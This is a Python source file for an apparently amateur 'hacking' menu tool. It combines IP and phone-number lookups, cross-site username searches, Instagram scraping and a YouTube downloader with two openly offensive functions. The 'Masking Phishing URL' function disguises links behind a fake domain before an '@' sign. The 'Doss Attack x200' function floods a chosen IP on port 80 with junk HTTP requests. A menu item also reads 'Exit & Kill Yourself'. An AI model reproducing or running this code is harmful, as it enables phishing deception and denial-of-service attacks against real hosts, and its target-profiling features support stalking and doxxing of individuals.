import json,requests,time,os,phonenumbers
import instaloader, socket, webbrowser, sys

from phonenumbers import carrier, geocoder, timezone
from requests.utils import quote as urlEncode
from json import loads
from requests import get
from bs4 import BeautifulSoup
from sys import stderr
from pytube import YouTube
from colorama import Fore, init




Re, Gr, Wh, Ye= '\033[1;31m', '\033[1;32m', '\033[1;37m', '\033[1;33m'


def is_option(func):
    def wrapper(*args, **kwargs):
        func(*args, **kwargs)

    return wrapper

# FUNCTIONS FOR MENU
@is_option
def help():
    print('\n')
    for opt in options:
        print(f' {Wh}[{opt["num"]}]{Gr} {opt["help"]}')

@is_option
def IntPrMode():
    ip = input(f"{Wh}\n Enter IP target : {Gr}")  # INPUT IP ADDRESS
    print()
    print(f'{Gr} SHOW INFORMATION IP ADDRESS')
    req_api = requests.get(f"http://ipwho.is/{ip}")  # API IPWHOIS.IS
    ip_data = json.loads(req_api.text)
    time.sleep(2)
    print(f"{Wh}\n IP target       :{Gr}", ip)
    print(f"{Wh} Type IP         :{Gr}", ip_data["type"])
    print(f"{Wh} Country         :{Gr}", ip_data["country"])
    print(f"{Wh} Country Code    :{Gr}", ip_data["country_code"])
    print(f"{Wh} City            :{Gr}", ip_data["city"])
    print(f"{Wh} Continent       :{Gr}", ip_data["continent"])
    print(f"{Wh} Continent Code  :{Gr}", ip_data["continent_code"])
    print(f"{Wh} Region          :{Gr}", ip_data["region"])
    print(f"{Wh} Region Code     :{Gr}", ip_data["region_code"])
    print(f"{Wh} Latitude        :{Gr}", ip_data["latitude"])
    print(f"{Wh} Longitude       :{Gr}", ip_data["longitude"])
    lat = int(ip_data['latitude'])
    lon = int(ip_data['longitude'])
    print(f"{Wh} EU              :{Gr}", ip_data["is_eu"])
    print(f"{Wh} Postal          :{Gr}", ip_data["postal"])
    print(f"{Wh} Calling Code    :{Gr}", ip_data["calling_code"])
    print(f"{Wh} Capital         :{Gr}", ip_data["capital"])
    print(f"{Wh} Borders         :{Gr}", ip_data["borders"])
    print(f"{Wh} ISP             :{Gr}", ip_data["connection"]["isp"])
    print(f"{Wh} Domain          :{Gr}", ip_data["connection"]["domain"])
    print(f"{Wh} ID              :{Gr}", ip_data["timezone"]["id"])
    print(f"{Wh} ABBR            :{Gr}", ip_data["timezone"]["abbr"])
    print(f"{Wh} DST             :{Gr}", ip_data["timezone"]["is_dst"])
    print(f"{Wh} Offset          :{Gr}", ip_data["timezone"]["offset"])

@is_option
def numberMode():
    # INPUT NUMBER PHONE
    User_phone = input(f"\n {Wh}Enter number target {Gr}Ex +39xxxx {Wh}: {Gr}")
    default_region = "TO"  
    # VARIABLE PHONENUMBERS
    parsed_number = phonenumbers.parse(User_phone, default_region) 
    region_code = phonenumbers.region_code_for_number(parsed_number)
    jenis_provider = carrier.name_for_number(parsed_number, "en")
    location = geocoder.description_for_number(parsed_number, "to")
    is_valid_number = phonenumbers.is_valid_number(parsed_number)
    is_possible_number = phonenumbers.is_possible_number(parsed_number)
    formatted_number = phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
    formatted_number_for_mobile = phonenumbers.format_number_for_mobile_dialing(
        parsed_number, default_region,with_formatting=True)
    number_type = phonenumbers.number_type(parsed_number)
    timezone1 = timezone.time_zones_for_number(parsed_number)
    timezoneF = ', '.join(timezone1)

    print(f"\n{Gr} SHOW INFORMATION PHONE NUMBERS\n")
    print(f" {Wh}Region Code     :{Gr} {region_code}")
    print(f" {Wh}Operator        :{Gr} {jenis_provider}")
    print(f" {Wh}Valid number    :{Gr} {is_valid_number}")
    print(f" {Wh}Possible number :{Gr} {is_possible_number}")
    print(f" {Wh}International   :{Gr} {formatted_number}")
    print(f" {Wh}Country code    :{Gr} {parsed_number.country_code}")
    print(f" {Wh}Local number    :{Gr} {parsed_number.national_number}")
    if number_type == phonenumbers.PhoneNumberType.MOBILE:
        print(f" {Wh}Type            :{Gr} mobile number")
    elif number_type == phonenumbers.PhoneNumberType.FIXED_LINE:
        print(f" {Wh}Type            :{Gr} fixed-line number")
    else:
        print(f" {Wh}Type            :{Gr} unknown")

@is_option
def userSSMode():
    try:
        username = input(f"\n {Wh}Enter Username : {Gr}")
        results = {}
        social_media = [
            {"url": "https://www.facebook.com/{}", "name": "Facebook"},
            {"url": "https://www.twitter.com/{}", "name": "Twitter"},
            {"url": "https://www.instagram.com/{}", "name": "Instagram"},
            {"url": "https://www.linkedin.com/in/{}", "name": "LinkedIn"},
            {"url": "https://www.github.com/{}", "name": "GitHub"},
            {"url": "https://www.pinterest.com/{}", "name": "Pinterest"},
            {"url": "https://www.tumblr.com/{}", "name": "Tumblr"},
            {"url": "https://www.youtube.com/{}", "name": "Youtube"},
            {"url": "https://soundcloud.com/{}", "name": "SoundCloud"},
            {"url": "https://www.snapchat.com/add/{}", "name": "Snapchat"},
            {"url": "https://www.tiktok.com/@{}", "name": "TikTok"},
            {"url": "https://www.behance.net/{}", "name": "Behance"},
            {"url": "https://www.medium.com/@{}", "name": "Medium"},
            {"url": "https://www.quora.com/profile/{}", "name": "Quora"},
            {"url": "https://www.flickr.com/people/{}", "name": "Flickr"},
            {"url": "https://www.periscope.tv/{}", "name": "Periscope"},
            {"url": "https://www.twitch.tv/{}", "name": "Twitch"},
            {"url": "https://www.dribbble.com/{}", "name": "Dribbble"},
            {"url": "https://www.stumbleupon.com/stumbler/{}", "name": "StumbleUpon"},
            {"url": "https://www.ello.co/{}", "name": "Ello"},
            {"url": "https://www.producthunt.com/@{}", "name": "Product Hunt"},
            {"url": "https://www.snapchat.com/add/{}", "name": "Snapchat"},
            {"url": "https://www.telegram.me/{}", "name": "Telegram"},
            {"url": "https://www.weheartit.com/{}", "name": "We Heart It"}
        ]
        for site in social_media:
            url = site['url'].format(username)
            response = requests.get(url)
            if response.status_code == 200:
                results[site['name']] = url
            else:
                results[site['name']] = (f"{Re}! Username not found !")
    except Exception as e:
        print(f"{Re}Error : {e}")
        return

    print(f"\n{Gr} SHOW INFORMATION USERNAME")
    print()
    for site, url in results.items():
        print(f"{Wh} {Gr}+ {Wh} {site} : {Gr}{url}")

@is_option
def mirrorMode():
    respone = requests.get('https://api.ipify.org/')
    Show_IP = respone.text

    print(f"\n{Gr} SHOW INFORMATION YOUR IP")
    print(f"\n{Wh}{Gr} + {Wh} Your IP Adrress : {Gr}{Show_IP}")

@is_option
def instaSMode():
    URL = "https://www.instagram.com/{}/"
    username = input(f"\n {Wh}Enter username target : {Gr}")
    print(f"\n{Gr} SHOW INFORMATION IG USER\n")
    # getting the request from url
    r = requests.get(URL.format(username))

    # converting the text
    s = BeautifulSoup(r.text, "html.parser")

    # finding meta info
    meta = s.find("meta", property ="og:description")

    # calling parse method
    s = meta.attrs['content']
    data = {}

    # splitting the content 
    # then taking the first part
    s = s.split("-")[0]

    # again splitting the content 
    s = s.split(" ")

    # assigning the values
    data['Followers'] = s[0]
    data['Following'] = s[2]
    data['Posts'] = s[4]

	
    print(f" {Wh}Followers            :{Gr} {data['Followers']}")
    print(f" {Wh}Following            :{Gr} {data['Following']}")
    print(f" {Wh}Posts                :{Gr} {data['Posts']}\n")

    try:
        ig = instaloader.Instaloader()
        ig.download_profile(username , profile_pic=True)
    except:
        print(f'\n {Re}!This is a private account!')

@is_option
def maskinMode():
    class Doppelgang:
        def __init__(self,url,maskingDomain="google.com",keyword="login"):
            self.url = url
            self.maskingDomain = maskingDomain
            self.keyword = keyword
            self.shorturl = None
        def shorten(self):
            encodedUrl = urlEncode(self.url)
            res = get(f"https://is.gd/create.php?format=json&url={encodedUrl}").text
            json = loads(res)
            try:
                self.shorturl = json["shorturl"]
            except:
                self.shorturl = self.url
            return self.shorturl

        def mask(self):
            maskedURL = self.shorturl.replace("https://",f"https://{self.maskingDomain}-{self.keyword}@")
            return maskedURL

    url = input(f"\n{Wh} Enter the url to be masked: {Gr}")
    mask = input(f"{Wh} Enter a masking domain: {Gr}")
    keyword = input(f"{Wh} Type a kewword [no whiteSP]: {Gr}")
    target = Doppelgang(url,mask,keyword)
    target.shorten()
    print(f"{Wh} Output url: {Gr}",target.mask())

@is_option
def dossNNMode():
    target = input(f"\n{Wh} Enter target ip:{Gr} ")

    for i in range(1,200):
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target,80))
        data = b"GET / HTTP 1.1\r\n"*1000
        s.send(data)
        s.close()

@is_option
def encrypMode():
    webbrowser.open('https://kcisti.github.io/encryptedRoom/')

@is_option
def downloMode():
    links=list()
    # Example usage
    link = input(f'\n {Wh}target video URL: {Gr}')
    links.append(link)

    if len(links) == 0:
        print(f" {Re}!There are no urls available!")
        sys.exit()
    
    for link in links:
        url = link.strip()
        #check if the os is windows/macOS it save all videos in videos folder
        if os.name == 'nt' or os.name == 'posix':
            output_path = ""

            yt = YouTube(url)
            stream = yt.streams.filter(progressive=True, resolution="720p").filter(only_audio=False).first()
            # Try to find a 720p video with audio
            if not stream:
                stream = yt.streams.filter(progressive=True, resolution="480p").filter(only_audio=False).first()
            # If no 480p video found, try 360p
            elif not stream:
                stream = yt.streams.filter(progressive=True, resolution="360p").filter(only_audio=False).first()
            # Download the stream
            if stream:
                print(f"\n{Gr} Please wait downloading..")
                stream.download(output_path)
                print(f"{Gr} Download Completed {output_path}\n")
            else:
                print(f"{Re} !Couldn't find video!\n")

        #if the os is linux/termux it save all videos in Download/YT_Downloader folder
        else:
            output_path = ""
            yt = YouTube(url)
            stream = yt.streams.filter(progressive=True, resolution="720p").filter(only_audio=False).first()
            # Try to find a 720p video with audio
            if not stream:
                stream = yt.streams.filter(progressive=True, resolution="480p").filter(only_audio=False).first()
            # If no 480p video found, try 360p
            elif not stream:
                stream = yt.streams.filter(progressive=True, resolution="360p").filter(only_audio=False).first()
            # Download the stream
            if stream:
                print(f"{Gr} Please wait downloading..")
                stream.download(output_path)
                print(f"{Gr} Download Completed - {output_path}\n")
            else:
                print(f"{Re} !Couldn't find video!\n")

    print(f"{Gr} Video Downloaded Complete")

options = [
    {
        'num': 10,
        'text': 'Exit & Kill Yourself',
        'help' : 'Exit',
        'func': exit
    },
    {
        'num': 11,
        'text': 'Help for beginners Mode',
        'help' : 'Help',
        'func': help
    },
    {
        'num': 12,
        'text': 'Internet Protocol Tracker',
        'help' : 'IP Tracker',
        'func': IntPrMode
    },
    {
        'num': 13,
        'text': 'Your Internet Protocol',
        'help' : 'Show your IP',
        'func': mirrorMode

    },
    {
        'num': 14,
        'text': 'User Social Finder',
        'help' : 'Username Finder',
        'func': userSSMode
    },
    {
        'num': 15,
        'text': 'Phone Number Tracker',
        'help' : 'Phone Number Tracker',
        'func': numberMode
    },
    {
        'num': 16,
        'text': 'Instagram Info & Scraping',
        'help' : 'Download IG Data',
        'func': instaSMode
    },
    {
        'num': 17,
        'text': 'Masking Phishing URL',
        'help' : 'Mask URL',
        'func': maskinMode
    },
    {
        'num': 18,
        'text': 'Doss Attack x200',
        'help' : 'Doss Attack',
        'func': dossNNMode
    },
    {
        'num': 19,
        'text': 'Encrypted Chat Room',
        'help' : 'Encrypted Chat Room',
        'func': encrypMode
    },
    {
        'num': 20,
        'text': 'Download Youtube Video',
        'help' : 'Download Youtube Video',
        'func': downloMode
    },
]